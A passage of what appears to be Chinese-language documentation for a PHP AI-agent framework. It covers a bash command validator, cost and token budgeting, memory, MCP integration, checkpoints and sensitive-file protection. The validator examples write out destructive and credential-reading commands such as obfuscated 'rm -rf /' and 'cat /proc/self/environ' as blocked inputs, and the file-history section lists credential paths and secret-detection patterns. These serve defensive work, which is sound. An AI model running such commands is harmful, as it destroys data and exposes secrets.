$v->validate("rm \$'\\x2drf' /")->isDenied();              // ANSI-C 引号
$v->validate('cat /proc/self/environ')->isDenied();         // proc environ
$v->validate("echo test\nrm -rf /")->isDenied();           // 换行注入
$v->validate('zmodload zsh/system')->isDenied();            // Zsh 危险
$v->validate('echo hello\;rm -rf /')->isDenied();          // 转义运算符

// 这些透过（未发现问题）：
$v->validate('git log --oneline -10')->isPassthrough();     // 只读
$v->validate('ls -la /tmp')->isPassthrough();               // 安全命令
$v->validate('echo "hello world"')->isPassthrough();        // 正常引号

// 这个被明确允许（安全 heredoc）：
$v->validate("git commit -m \"\$(cat <<'EOF'\nmessage\nEOF\n)\"")->isAllowed();
```

#### 权限流中的分类器

```php
use SuperAgent\Permissions\BashCommandClassifier;

$classifier = new BashCommandClassifier();

function checkCommand(string $cmd): string {
    $c = (new BashCommandClassifier())->classify($cmd);

    if ($c->risk === 'critical') {
        return "已阻止: {$c->reason}";
    }
    if ($c->requiresApproval()) {
        return "需要批准 ({$c->risk}): {$c->reason}";
    }
    return "自动允许: {$c->prefix}";
}

echo checkCommand('git status');        // 自动允许: git status
echo checkCommand('npm install foo');   // 需要批准 (medium): ...
echo checkCommand('sudo rm -rf /');     // 已阻止: 命令 'sudo' 被分类为 critical 风险
echo checkCommand('echo $(whoami)');    // 已阻止: 检测到 $() 命令替换
```

### 故障排除

| 问题 | 原因 | 解决方案 |
|---------|-------|----------|
| 安全命令被标记为危险 | 参数中包含元字符/替换 | 确保参数正确引用 |
| `cut -d','` 被标记为混淆 | 标志前引号模式 | 验证器特别豁免 `cut -d` 模式 |
| 只读命令需要批准 | 命令不在前缀列表中 | 添加前缀到 `READ_ONLY_PREFIXES` 或使用 `isReadOnly()` |
| 复杂管道命令被阻止 | `isTooComplex` 为 true | 拆分为单独命令或接受批准提示 |
| Heredoc 被标记 | 不匹配安全模式 | 使用 `$(cat <<'DELIM'...DELIM)` 模式并用单引号引用分隔符 |

---

## 8. 成本自动驾驶

> 智能预算控制，监控累计支出并自动采取递进操作 -- 警告、压缩上下文、降级模型、停止 -- 以防止预算超支。

### 概述

成本自动驾驶实时监控你的 AI agent 支出，在预算阈值被突破时做出反应。默认升级阶梯：

| 预算已用 | 操作 | 效果 |
|---|---|---|
| 50% | `warn` | 记录警告；无自动更改 |
| 70% | `compact_context` | 信号查询引擎压缩旧消息 |
| 80% | `downgrade_model` | 将提供者切换到下一个更便宜的模型层级 |
| 95% | `halt` | 完全停止 agent 循环 |

自动驾驶支持**会话预算**（每次调用）、**月度预算**（跨会话），或两者兼有。

### 配置

```php
'cost_autopilot' => [
    'enabled' => env('SUPERAGENT_COST_AUTOPILOT_ENABLED', false),
    'session_budget_usd' => (float) env('SUPERAGENT_SESSION_BUDGET', 0),
    'monthly_budget_usd' => (float) env('SUPERAGENT_MONTHLY_BUDGET', 0),
],
```

### 用法

```php
use SuperAgent\CostAutopilot\BudgetConfig;
use SuperAgent\CostAutopilot\CostAutopilot;

$config = BudgetConfig::fromArray([
    'session_budget_usd' => 5.00,
    'monthly_budget_usd' => 100.00,
]);

$autopilot = new CostAutopilot($config);
$autopilot->setCurrentModel('claude-opus-4-20250514');

$decision = $autopilot->evaluate($sessionCostUsd);

if ($decision->hasDowngrade()) {
    $provider->setModel($decision->newModel);
}
if ($decision->shouldCompact()) {
    $queryEngine->compactMessages();
}
if ($decision->shouldHalt()) {
    break;
}
```

### 故障排除

**自动驾驶从未触发。** 检查 `cost_autopilot.enabled` 是否为 `true`，且至少设置了一个预算。确认你在调用 `evaluate()` 时传入的是累计会话成本。

**进程重启后支出数据丢失。** 向 `BudgetTracker` 构造函数传入文件路径。

---

## 9. Token 预算续行

> 基于动态预算的 agent 循环控制，具有 90% 完成阈值、递减收益检测和基于提示的续行机制 -- 替代固定的 maxTurns。

### 概述

Token 预算系统用动态的、预算感知的策略替代固定的 `maxTurns`。agent 持续运行直到：

1. **消耗了 90% 的 Token 预算**，或
2. **检测到递减收益**（在 3 次以上续行后连续两次低增量轮次）

### 用法

```php
use SuperAgent\TokenBudget\TokenBudgetTracker;

$tracker = new TokenBudgetTracker();

$decision = $tracker->check(
    budget: 50_000,
    globalTurnTokens: 20_000,
    isSubAgent: false,
);

if ($decision->shouldContinue()) {
    $messages[] = new UserMessage($decision->nudgeMessage);
} elseif ($decision->shouldStop()) {
    // 处理停止
}
```

### 故障排除

**Agent 过早停止** -- 增加 `tokenBudget` 值。

**子 agent 不执行多轮** -- 子 agent 按设计始终在一轮后停止。

---

## 10. 智能上下文窗口

> 根据任务复杂度在思维和上下文之间动态分配 Token，支持策略预设和按任务覆盖。

### 概述

智能上下文窗口系统根据任务复杂度，在**思维**（扩展推理）和**上下文**（对话历史）之间动态分配总 Token 预算。

### 策略预设

| 策略 | 思维 | 上下文 | 保留最近消息 |
|----------|----------|---------|-------------|
| `deep_thinking` | 60% | 40% | 4 条消息 |
| `balanced` | 40% | 60% | 8 条消息 |
| `broad_context` | 15% | 85% | 16 条消息 |

### 用法

```php
$manager = new SmartContextManager(totalBudgetTokens: 100_000);

$allocation = $manager->allocate('Refactor the auth module to use OAuth2 with PKCE flow');
// strategy=deep_thinking, thinking=60K, context=40K

$allocation = $manager->allocate('Show me the contents of config.php');
// strategy=broad_context, thinking=15K, context=85K

$manager->setForceStrategy('deep_thinking'); // 覆盖
```

### 故障排除

**思维预算未被应用** -- 显式的 `options['thinking']` 优先于智能上下文分配。

---

## 11. 自适应反馈

> 一个学习系统，跟踪用户的反复纠正和拒绝，然后自动将持续出现的模式提升为防护规则或记忆条目，使 agent 避免重复相同的错误。

### 概述

每当用户拒绝工具执行、撤销编辑、拒绝输出或给出明确的行为反馈时，自适应反馈系统会记录一个**纠正模式**。当模式超过可配置的提升阈值（默认：3 次）时，系统自动提升它：

- **工具拒绝**和**编辑撤销**成为**防护规则**
- **行为纠正**、**不需要的内容**和**输出拒绝**成为**记忆条目**

### 5 种纠正类别

| 类别 | 触发条件 | 提升为 |
|---|---|---|
| 工具被拒绝 | 用户拒绝工具权限请求 | 防护规则 |
| 输出被拒绝 | 用户说"不"、"错误"，拒绝结果 | 记忆条目 |
| 行为纠正 | 明确反馈如"停止给每个函数添加注释" | 记忆条目 |
| 编辑被撤销 | 用户撤销 agent 的文件编辑 | 防护规则 |
| 不需要的内容 | 用户标记内容为不必要 | 记忆条目 |

### 用法

```php
$collector = new CorrectionCollector($store);
$collector->recordDenial('Bash', ['command' => 'rm -rf /tmp/data'], 'User denied');
$collector->recordCorrection('stop adding docstrings to every function');

$engine = new AdaptiveFeedbackEngine($store, promotionThreshold: 3, autoPromote: true);
$engine->setGuardrailsEngine($guardrailsEngine);
$engine->setMemoryStorage($memoryStorage);
$promotions = $engine->evaluate();
```

### 故障排除

**模式未被提升。** 确认 `auto_promote` 为 `true` 且 `evaluate()` 正在被调用。

---

## 12. 技能蒸馏

> 自动捕获成功的 agent 执行轨迹，并将其蒸馏为可复用的 Markdown 技能模板，使更便宜的模型能够遵循，大幅降低重复任务的成本。

### 概述

当昂贵的模型解决多步骤任务时，技能蒸馏系统捕获完整的执行轨迹，并将其蒸馏为适用于更便宜模型的分步技能模板。

| 源模型 | 目标模型 | 估计节省 |
|---|---|---|
| Claude Opus | Claude Sonnet | ~70% |
| Claude Sonnet | Claude Haiku | ~83% |
| GPT-4o | GPT-4o-mini | ~88% |

### 用法

```php
$trace = ExecutionTrace::fromMessages($prompt, $messages, $model, $cost, $inTokens, $outTokens, $turns);
$store = new DistillationStore(storage_path('superagent/distilled_skills.json'));
$engine = new DistillationEngine($store, minSteps: 3, minCostUsd: 0.01);

if ($engine->isWorthDistilling($trace)) {
    $skill = $engine->distill($trace, 'add-input-validation');
}
```

### 故障排除

**轨迹从未被蒸馏。** 检查是否满足 `min_steps` 和 `min_cost_usd` 阈值。包含错误的轨迹会被拒绝。

---

## 13. 记忆系统

> 跨会话持久记忆，具有实时提取、KAIROS 仅追加每日日志和夜间自动整理（auto-dream）合并为结构化 MEMORY.md 索引。

### 概述

SuperAgent 记忆系统在三个层次运作：

1. **实时会话记忆提取** -- 3 门触发机制（Token 阈值、Token 增长、活动阈值）
2. **KAIROS 每日日志** -- 仅追加的时间戳日志
3. **自动整理合并** -- 4 阶段流程（定向、收集、合并、修剪）

### 记忆类型

| 类型 | 描述 | 默认范围 |
|------|-------------|---------------|
| `user` | 用户的角色、目标、职责 | `private` |
| `feedback` | 关于如何处理工作的指导 | `private` |
| `project` | 进行中的工作、目标、无法从代码推导的事件 | `team` |
| `reference` | 外部系统的指针 | `team` |

### 配置

```php
$config = new MemoryConfig(
    minimumMessageTokensToInit: 8000,
    minimumTokensBetweenUpdate: 4000,
    toolCallsBetweenUpdates: 5,
    autoDreamMinHours: 24,
    autoDreamMinSessions: 5,
    maxMemoryFiles: 200,
    maxEntrypointLines: 200,
    maxEntrypointBytes: 25000,
    staleMemoryDays: 30,
    expireMemoryDays: 90,
);
```

### 用法

```php
// 会话记忆提取
$extractor = new SessionMemoryExtractor($provider, $config, $logger);
$extractor->maybeExtract($messages, $sessionId, $memoryBasePath, $lastTurnHadToolCalls);

// 每日日志
$dailyLog = new DailyLog($memoryDir, $logger);
$dailyLog->append('User prefers factory pattern over builder');

// 自动整理合并
$consolidator = new AutoDreamConsolidator($storage, $provider, $config, $logger);
if ($consolidator->shouldRun()) {
    $consolidator->run();
}
```

### 故障排除

**记忆未被提取** -- 确认对话至少有 8,000 个 Token。

**自动整理未运行** -- 确认自上次运行以来已过至少 24 小时且有 5 个会话。

---

## 14. 知识图谱

> 一个共享的、持久的文件、符号、agent 和决策图谱，跨多 agent 会话累积 -- 使后续 agent 能够跳过重复的代码库探索。

### 概述

当 agent 执行工具调用时，知识图谱自动将事件捕获为有向图中的**节点**（文件、符号、Agent、决策、工具）和**边**（读取、修改、创建、依赖、决定、搜索、执行、定义于）。

### 用法

```php
$graph = new KnowledgeGraph(storage_path('superagent/knowledge_graph.json'));
$collector = new GraphCollector($graph, 'my-agent');

$collector->recordToolCall('Read', ['file_path' => '/src/App.php'], 'file content...');
$collector->recordToolCall('Edit', ['file_path' => '/src/App.php'], 'OK');
$collector->recordDecision('Chose repository pattern for data access');

$hotFiles = $graph->getHotFiles(10);
$agents = $graph->getAgentsForFile('src/App.php');
$summary = $graph->getSummary();
```

### 故障排除

**图谱为空** -- 确认 `knowledge_graph.enabled` 为 `true` 且 `GraphCollector::recordToolCall()` 正在被调用。

**图谱增长过大** -- 收集器将每次 Grep/Glob 调用的结果限制为 20 个文件。定期导出并清理。

---

## 15. 扩展思维

> 自适应、启用或禁用的思维模式，支持 ultrathink 关键词触发、模型能力检测和预算 Token 管理。

### 概述

扩展思维允许 agent 执行显式的思维链推理。三种模式：

| 模式 | 行为 |
|------|----------|
| **adaptive** | 模型决定何时以及思考多少。Claude 4.6+ 的默认模式。 |
| **enabled** | 始终使用可配置的固定预算进行思考。 |
| **disabled** | 不思考。最快且最便宜。 |

**ultrathink** 关键词触发将预算最大化到 128,000 个 Token。

### 用法

```php
$config = ThinkingConfig::adaptive();
$config = ThinkingConfig::enabled(budgetTokens: 20_000);
$config = ThinkingConfig::disabled();

// Ultrathink
$boosted = $config->maybeApplyUltrathink('ultrathink: analyze the race condition');
// mode=enabled, budget=128000

// 模型能力检测
ThinkingConfig::modelSupportsThinking('claude-opus-4-20260401');   // true
ThinkingConfig::modelSupportsAdaptiveThinking('claude-opus-4-6');   // true

// API 参数
$param = $config->toApiParameter('claude-sonnet-4-20260401');
// ['type' => 'enabled', 'budget_tokens' => 20000]
```

### 故障排除

**思维未激活** -- 确认模型支持思维。仅 Claude 4+ 和 Claude 3.5 Sonnet v2+ 支持。

**Ultrathink 不工作** -- 需要 `ultrathink` 实验功能标志。

---

## 16. MCP 协议集成

> 使用模型上下文协议（MCP）将 SuperAgent 连接到外部工具服务器，支持 stdio、HTTP 和 SSE 传输方式，自动工具发现、服务器指令注入，以及通过 TCP 桥接与子进程共享 stdio 连接。

### 概述

SuperAgent 实现了完整的 MCP 客户端，包含三个核心类：

- **`MCPManager`** -- 服务器配置、连接和工具聚合的单例注册表
- **`Client`** -- MCP 协议生命周期的 JSON-RPC 客户端
- **`MCPBridge`** -- 用于与子进程共享 stdio 连接的 TCP 代理

### 传输方式

| 传输方式 | 使用场景 |
|-----------|----------|
| **stdio** | 生成本地进程，通过 stdin/stdout 通信 |
| **HTTP** | 连接到 HTTP 端点 |
| **SSE** | 连接到 Server-Sent Events 端点 |

### 配置

```json
{
  "mcpServers": {
    "filesystem": {
      "type": "stdio",
      "command": "npx",
      "args": ["-y", "@anthropic/mcp-server-filesystem", "/home/user/projects"],
      "env": { "NODE_ENV": "production" }
    },
    "remote-api": {
      "type": "http",
      "url": "https://mcp.example.com/v1",
      "headers": { "Authorization": "Bearer ${API_TOKEN}" }
    }
  }
}
```

### 用法

```php
$manager = MCPManager::getInstance();
$manager->loadFromClaudeCode('/path/to/project');
$manager->autoConnect();

$tools = $manager->getTools();
$result = $manager->getTool('mcp_filesystem_readFile')->execute(['path' => '/home/user/example.txt']);
$instructions = $manager->getConnectedInstructions();
```

### TCP 桥接

```
父进程:   StdioTransport <-> MCPBridge TCP 监听器 (:port)
子进程 1:  HttpTransport -> localhost:port --> MCPBridge --> StdioTransport
```

桥接信息写入 `/tmp/superagent_mcp_bridges_<pid>.json`。

### 故障排除

| 问题 | 解决方案 |
|---------|----------|
| "MCP server 'X' not registered" | 检查 JSON 配置或调用 `registerServer()` |
| "Failed to start MCP server" | 确认命令可以独立运行 |
| 子进程未发现桥接 | 检查 `/tmp/superagent_mcp_bridges_*.json` |
| 环境变量未展开 | 使用 `${VAR}` 或 `${VAR:-default}`，而非 `$VAR` |

---

## 17. 桥接模式

> 透明增强非 Anthropic LLM 提供者（OpenAI、Ollama、Bedrock、OpenRouter），使用 SuperAgent 的优化系统提示、bash 安全验证、上下文压缩、成本跟踪等功能。

### 概述

桥接模式用增强管线包装任何 `LLMProvider`。每次 LLM 调用分两个阶段：

1. **请求前**：增强器修改消息、工具、系统提示和选项
2. **响应后**：增强器检查和转换 `AssistantMessage`

### 可用增强器

1. **SystemPromptEnhancer** -- 注入优化的系统提示部分
2. **ContextCompactionEnhancer** -- 无需 LLM 调用即可减小消息上下文大小
3. **BashSecurityEnhancer** -- 验证响应中的 bash 命令
4. **MemoryInjectionEnhancer** -- 注入相关记忆上下文
5. **ToolSchemaEnhancer** -- 用元数据增强工具模式
6. **ToolSummaryEnhancer** -- 添加摘要工具文档
7. **TokenBudgetEnhancer** -- 管理 Token 预算约束
8. **CostTrackingEnhancer** -- 跟踪 Token 使用和成本

### 用法

```php
use SuperAgent\Bridge\BridgeFactory;

// 从配置自动检测提供者，应用所有启用的增强器
$provider = BridgeFactory::createProvider('gpt-4o');

// 或包装现有提供者
$enhanced = BridgeFactory::wrapProvider($openai);

// 或手动组装
$enhanced = new EnhancedProvider(
    inner: new OllamaProvider(['base_url' => 'http://localhost:11434', 'model' => 'codellama']),
    enhancers: [new SystemPromptEnhancer(), new BashSecurityEnhancer()],
);
```

### 故障排除

**"Unsupported bridge provider: anthropic"** -- Anthropic 提供者不需要桥接增强。

**响应中 bash 命令被阻止** -- `BashSecurityEnhancer` 将危险的 tool_use 块替换为文本警告。

---

## 18. 遥测与可观测性

> 完整的可观测性堆栈，具有主开关和独立的每子系统控制，用于追踪、结构化日志、指标收集、成本跟踪、事件分发和按事件类型采样。

### 概述

五个独立子系统，全部受主 `telemetry.enabled` 开关控制：

| 子系统 | 类 | 配置键 |
|-----------|-------|-----------|
| **追踪** | `TracingManager` | `telemetry.tracing.enabled` |
| **日志** | `StructuredLogger` | `telemetry.logging.enabled` |
| **指标** | `MetricsCollector` | `telemetry.metrics.enabled` |
| **成本跟踪** | `CostTracker` | `telemetry.cost_tracking.enabled` |
| **事件** | `EventDispatcher` | `telemetry.events.enabled` |
| **采样** | `EventSampler` | （内联配置） |

### 用法

```php
// 追踪
$tracing = TracingManager::getInstance();
$span = $tracing->startInteractionSpan('user-query');
$llmSpan = $tracing->startLLMRequestSpan('claude-3-sonnet', $messages);
$tracing->endSpan($llmSpan, ['input_tokens' => 1500]);

// 结构化日志（自动脱敏敏感数据）
$logger = StructuredLogger::getInstance();
$logger->logLLMRequest('claude-3-sonnet', $messages, $response, 1250.5);

// 指标
$metrics = MetricsCollector::getInstance();
$metrics->incrementCounter('llm.requests', 1, ['model' => 'claude-3-sonnet']);
$metrics->recordHistogram('llm.request_duration_ms', 1250.5);

// 成本跟踪
$tracker = CostTracker::getInstance();
$cost = $tracker->trackLLMUsage('claude-3-sonnet', 1500, 800, 'sess-abc');

// 事件分发
$dispatcher = EventDispatcher::getInstance();
$dispatcher->listen('tool.completed', function (array $data) { /* ... */ });

// 采样
$sampler = new EventSampler([
    'llm.request' => ['sample_rate' => 1.0],
    'tool.started' => ['sample_rate' => 0.1],
]);
```

### 故障排除

| 问题 | 解决方案 |
|---------|----------|
| 无遥测输出 | 将 `telemetry.enabled` 设为 `true` |
| 未知模型成本 = 0 | 通过 `updateModelPricing()` 或配置添加 |
| 事件监听器未触发 | 启用 `telemetry.events.enabled` |

---

## 19. 工具搜索与延迟加载

> 带加权评分的模糊关键词搜索、直接选择模式，以及当工具定义超过上下文窗口 10% 时自动延迟加载。包括基于任务的预测以预加载相关工具。

### 概述

三个层次：

- **`ToolSearchTool`** -- 面向用户的搜索工具，支持直接选择（`select:Name1,Name2`）和模糊关键词搜索
- **`LazyToolResolver`** -- 按需工具解析，支持基于任务的预测
- **`ToolLoader`** -- 底层加载器，支持按类别加载和每工具元数据

当总工具 Token 成本超过模型上下文窗口的 **10%** 时，延迟加载启动。

### 评分系统

| 匹配类型 | 分数 |
|-----------|--------|
| 精确名称部分匹配 | **10** |
| 精确名称部分匹配（MCP 工具） | **12** |
| 部分名称部分匹配 | **6**（MCP 为 7.2） |
| 搜索提示匹配 | **4** |
| 描述匹配 | **2** |
| 全名包含查询 | **10** |

### 用法

```php
// 直接选择
$result = $tool->execute(['query' => 'select:Read,Edit,Grep']);

// 关键词搜索
$result = $tool->execute(['query' => 'notebook jupyter', 'max_results' => 5]);

// 基于任务的预测
$loaded = $resolver->predictAndPreload('Search for TODO comments and edit the files');

// 检查是否应激活延迟加载
$shouldDefer = ToolSearchTool::shouldDeferTools(totalToolTokens: 20000, contextWindow: 128000);
```

### 故障排除

| 问题 | 解决方案 |
|---------|----------|
| 搜索无结果 | 调用 `registerTool()` 或 `registerTools()` |
| 内存使用过高 | 使用 `unloadUnused()` 释放内存 |

---

## 20. 增量上下文与懒加载上下文

> 基于增量的上下文同步，具有自动检查点和压缩功能，以及带相关性评分、TTL 缓存、LRU 淘汰的懒片段加载，和将最相关上下文放入 Token 预算的 `getSmartWindow` API。

### 概述

两个互补系统：

- **增量上下文** -- 通过检查点之间的增量跟踪对话上下文随时间的变化。支持自动压缩、智能窗口和检查点/恢复。
- **懒加载上下文** -- 将上下文片段注册为元数据，根据任务相关性按需加载。包括 TTL 缓存、LRU 淘汰和基于优先级的预加载。

### 用法

#### 增量上下文

```php
$ctx = new IncrementalContextManager([
    'auto_compress' => true,
    'compress_threshold' => 4000,
    'checkpoint_interval' => 10,
]);

$ctx->initialize($messages);
$ctx->addMessage($userMessage);

$delta = $ctx->getDelta();
$window = $ctx->getSmartWindow(maxTokens: 4000);
$summary = $ctx->getSummary();
```

#### 懒加载上下文

```php
$lazy = new LazyContextManager([
    'max_memory' => 50 * 1024 * 1024,
    'cache_ttl' => 600,
]);

$lazy->registerContext('project-readme', [
    'type' => 'documentation',
    'priority' => 7,
    'tags' => ['docs', 'overview'],
    'data' => [['role' => 'system', 'content' => 'Project overview: ...']],
]);

$lazy->registerContext('git-history', [
    'type' => 'code',
    'priority' => 5,
    'tags' => ['git', 'history'],
    'source' => function ($id, $meta) {
        return [['role' => 'system', 'content' => shell_exec('git log --oneline -20')]];
    },
]);

$context = $lazy->getContextForTask('Fix the OAuth2 bug', hints: ['auth', 'oauth']);
$window = $lazy->getSmartWindow(maxTokens: 8000, focusArea: 'auth');
```

### 故障排除

| 问题 | 解决方案 |
|---------|----------|
| "Checkpoint not found" | 增加 `max_checkpoints` 或使用最新的 |
| 懒加载上下文内存过高 | 降低 `max_memory` 或调用 `unloadStale()` |
| 压缩过于激进 | 将 `compression_level` 设为 `'minimal'` |
| 上下文片段过期 | 减少 `cache_ttl` 或调用 `clear()` |

---

## 21. 计划 V2 面谈阶段

> 迭代式结对规划工作流，agent 与用户协作探索代码库，增量构建结构化计划文件，在任何代码修改开始前需要明确批准。包括定期提醒和执行后验证。

### 概述

计划模式为复杂更改提供了规范化的工作流。agent 进入只读探索阶段，只能使用读取工具，在学习过程中更新计划文件，并就歧义向用户提问。在获得明确批准之前不会修改任何文件。

三个工具管理生命周期：

- **`EnterPlanModeTool`** -- 进入计划模式，支持面谈或传统 5 阶段工作流
- **`ExitPlanModeTool`** -- 退出，可选 `review`、`execute`、`save` 或 `discard`
- **`VerifyPlanExecutionTool`** -- 跟踪已计划步骤的执行并报告进度

### 计划文件结构

```markdown
# Plan: Add OAuth2 authentication to the API

Created: 2026-04-04 10:30:00

## Context
*为什么需要此更改*

## Recommended Approach
*一条清晰的实施路径*

## Critical Files
*需要修改的文件及行号*

## Existing Code to Reuse
*函数、工具、模式*

## Verification
*如何测试更改*
```

### 用法

```php
// 进入计划模式
$enter = new EnterPlanModeTool();
$result = $enter->execute([
    'description' => 'Add OAuth2 authentication to the API',
    'estimated_steps' => 8,
    'interview' => true,
]);

// Agent 探索并增量更新计划
EnterPlanModeTool::updatePlanFile('Context', 'The API currently uses basic API key auth...');
EnterPlanModeTool::updatePlanFile('Critical Files', "- `app/Http/Middleware/ApiAuth.php`...");
EnterPlanModeTool::addStep(['tool' => 'edit_file', 'description' => 'Add OAuth2ServiceProvider']);

// 退出并执行
$exit = new ExitPlanModeTool();
$result = $exit->execute(['action' => 'execute']);

// 验证每个步骤
$verifier = new VerifyPlanExecutionTool();
$verifier->execute(['step_number' => 1, 'tool' => 'write_file', 'result' => 'success']);
$verifier->execute(['step_number' => 2, 'tool' => 'edit_file', 'result' => 'success',
    'deviation' => 'Used Passport package instead of custom implementation']);
```

### 面谈阶段工作流

```
进入计划模式
     |
     v
+--> 探索 (Glob/Grep/Read) -------+
|    |                              |
|    v                              |
|    更新计划文件                    |
|    |                              |
|    v                              |
|    就歧义向用户提问               |
|    |                              |
+----+（重复直到完成）              |
     |                              |
     v                              |
退出计划模式 --> 用户批准           |
     |                              |
     v                              |
执行步骤 <--------+                 |
     |             |                |
     v             |                |
验证步骤 ----------+                |
     |                              |
     v                              |
执行摘要                            |
```

### 故障排除

| 问题 | 解决方案 |
|---------|----------|
| "Already in plan mode" | 使用 `discard` 或 `review` 调用 `ExitPlanModeTool` |
| "Not in plan mode" | 先调用 `EnterPlanModeTool` |
| 计划期间 agent 修改文件 | 每 5 轮触发提醒；检查 `getPlanModeReminder()` |
| 面谈阶段未激活 | 检查 `ExperimentalFeatures::enabled('plan_interview')` 或使用 `setInterviewPhaseEnabled(true)` 强制开启 |

---

## 22. 检查点与恢复

> 定期状态快照，允许 agent 在崩溃、超时或中断后从中断处恢复 -- 而非从头开始。

### 概述

长时间运行的 agent 任务可能因进程崩溃、超时或手动取消而中断。检查点与恢复系统定期将完整 agent 状态保存到磁盘。当 agent 重启时，可以从最新检查点恢复。

关键行为：

- **基于间隔**：每 N 轮创建检查点（默认：5）
- **自动修剪**：每个会话仅保留最新的 N 个检查点（默认：5）
- **按任务覆盖**：可按调用强制启用或禁用
- **完整状态捕获**：消息、轮次计数、成本、Token 使用量、子组件状态

### 配置

```php
'checkpoint' => [
    'enabled' => env('SUPERAGENT_CHECKPOINT_ENABLED', false),
    'interval' => (int) env('SUPERAGENT_CHECKPOINT_INTERVAL', 5),
    'max_per_session' => (int) env('SUPERAGENT_CHECKPOINT_MAX', 5),
],
```

### 用法

```php
use SuperAgent\Checkpoint\CheckpointManager;
use SuperAgent\Checkpoint\CheckpointStore;

$store = new CheckpointStore(storage_path('superagent/checkpoints'));
$manager = new CheckpointManager($store, interval: 5, maxPerSession: 5, configEnabled: true);

// 在 agent 循环中，每轮之后：
$checkpoint = $manager->maybeCheckpoint(
    sessionId: $sessionId,
    messages: $messages,
    turnCount: $currentTurn,
    totalCostUsd: $totalCost,
    turnOutputTokens: $outputTokens,
    model: $model,
    prompt: $originalPrompt,
);

// 启动时，检查是否有现有检查点
$latest = $manager->getLatest($sessionId);
if ($latest !== null) {
    $state = $manager->resume($latest->id);
    $messages     = $state['messages'];
    $turnCount    = $state['turnCount'];
    $totalCost    = $state['totalCostUsd'];
    $model        = $state['model'];
    $prompt       = $state['prompt'];
}

// 强制创建检查点（例如在执行风险操作前）
$checkpoint = $manager->createCheckpoint($sessionId, $messages, $turnCount, ...);

// 按任务覆盖
$manager->setForceEnabled(true);   // 强制开启
$manager->setForceEnabled(false);  // 强制关闭
$manager->setForceEnabled(null);   // 使用配置默认值
```

### CLI 管理

```bash
php artisan superagent:checkpoint list
php artisan superagent:checkpoint list --session=abc123
php artisan superagent:checkpoint show <checkpoint-id>
php artisan superagent:checkpoint resume <checkpoint-id>
php artisan superagent:checkpoint delete <checkpoint-id>
php artisan superagent:checkpoint clear
php artisan superagent:checkpoint prune --keep=3
php artisan superagent:checkpoint stats
```

### 故障排除

**检查点未被创建。** 确认 `checkpoint.enabled` 为 `true`（或使用 `setForceEnabled(true)`）。确认 `maybeCheckpoint()` 正在被调用且轮次计数是间隔的倍数。

**检查点文件变大。** 每个检查点包含完整的序列化消息历史。增加间隔或减少 `max_per_session`。

**恢复失败并报 "Unknown message class"。** 序列化数据包含无法识别的消息类型。支持的类型：`assistant`、`tool_result`、`user`。

**检查点 ID 冲突。** ID 是确定性的：`md5(sessionId:turnCount)`。同一轮次的第二个检查点会覆盖第一个。

---

## 23. 文件历史

> 每文件快照系统，具有 LRU 淘汰的每消息快照（最多 100 个）、每消息回退、差异统计、未变更文件的快照继承、撤销/重做栈、git 归属和敏感文件保护。

### 概述

文件历史系统有四个组件：

- **`FileSnapshotManager`** -- 核心快照引擎。创建和恢复每文件快照，管理带 LRU 淘汰的每消息快照（最多 100 个），支持回退到消息，并计算差异统计。
- **`UndoRedoManager`** -- 文件操作（创建、编辑、删除、重命名）的撤销/重做栈（最多 100 个）。
- **`GitAttribution`** -- 为 git 提交添加 AI 合作者归属，暂存文件，并提供更改摘要。
- **`SensitiveFileProtection`** -- 阻止对敏感文件的写入/删除操作，并在写入前检测内容中的密钥。

### 用法

#### 创建和恢复快照

```php
$manager = FileSnapshotManager::getInstance();

$snapshotId = $manager->createSnapshot('/path/to/file.php');
$success = $manager->restoreSnapshot($snapshotId);

// 每消息快照和回退
$manager->trackEdit('/path/to/file.php', 'msg-001');
$manager->makeMessageSnapshot('msg-001');
$changedPaths = $manager->rewindToMessage('msg-001');
```

#### 差异统计

```php
$diff = $manager->getDiff('/path/to/file.php', $fromSnapshotId, $toSnapshotId);
$stats = $manager->getDiffStats('msg-001');
// DiffStats { filesChanged: [...], insertions: 15, deletions: 3 }
```

#### 撤销/重做

```php
$undoRedo = UndoRedoManager::getInstance();
$undoRedo->recordAction(FileAction::edit('/path/to/file.php', $afterSnapshotId, $beforeSnapshotId));
$undoRedo->recordAction(FileAction::create('/path/to/new.php', $content, $snapshotId));
$undoRedo->undo();
$undoRedo->redo();
```

| 操作类型 | 撤销 | 重做 |
|-------------|------|------|
| `create` | 删除文件 | 从快照恢复 |
| `edit` | 恢复先前快照 | 恢复编辑后快照 |
| `delete` | 从快照恢复 | 再次删除文件 |
| `rename` | 重命名回去 | 重命名回来 |

#### Git 归属

```php
$git = GitAttribution::getInstance();

if ($git->isGitRepository()) {
    $git->createCommit(
        message: 'Add OAuth2 authentication',
        files: ['app/Http/Middleware/OAuth2.php', 'config/auth.php'],
        options: ['context' => 'Part of the auth upgrade', 'include_summary' => true],
    );
    // 包含 Co-Authored-By: SuperAgent AI <ai@superagent.local>
}
```

#### 敏感文件保护

```php
$protection = SensitiveFileProtection::getInstance();

$protection->isProtected('.env');                    // true
$protection->isProtected('app/Models/User.php');     // false

$result = $protection->checkOperation('write', '.env');
$result->allowed; // false

$secrets = $protection->detectSecrets('api_key=sk-1234567890abcdef');
// [['type' => 'api_key', 'pattern_matched' => true, 'position' => 0]]

$protection->addProtectedPattern('*.vault');
$protection->addProtectedFile('/path/to/specific/file.conf');
```

默认受保护模式包括：`*.env`、`.env.*`、`*.key`、`*.pem`、`*.p12`、`*.pfx`、`*_rsa`、`*_dsa`、`id_rsa*`、`.htpasswd`、`.npmrc`、`*.sqlite`、`*.db`、`secrets.*`、`credentials.*`、`auth.*`、`.ssh/*`、`.aws/credentials`、`.git/config` 等。

密钥检测模式：`api_key`、`aws_key`、`private_key`（PEM 头）、`token`/`bearer`、`password`、`database_url`（包含凭据的连接字符串）。

### 故障排除

| 问题 | 原因 | 解决方案 |
|---------|-------|----------|
| 快照返回 null | 文件不存在或快照已禁用 | 检查 `file_exists()` 和 `isEnabled()` |
| 回退失败 | 消息 ID 不在快照映射中 | 先检查 `canRewindToMessage()` |
| 旧快照丢失 | LRU 淘汰 | 增加 `MAX_MESSAGE_SNAPSHOTS`（默认 100） |
| 敏感文件写入被阻止 | 文件匹配受保护模式 | 移除模式或在测试时禁用保护 |
| Git 提交失败 | 没有暂存的更改或不是 git 仓库 | 检查 `hasStagedChanges()` 和 `isGitRepository()` |
| 撤销不工作 | 未记录快照 ID | 确保在编辑前后都调用 `createSnapshot()` |

---

## 24. 性能优化

> 13 项可配置策略，减少 Token 消耗（30-50%）、降低成本（40-60%）、提升缓存命中率（约 90%），并通过并行化加速工具执行。

### 概述

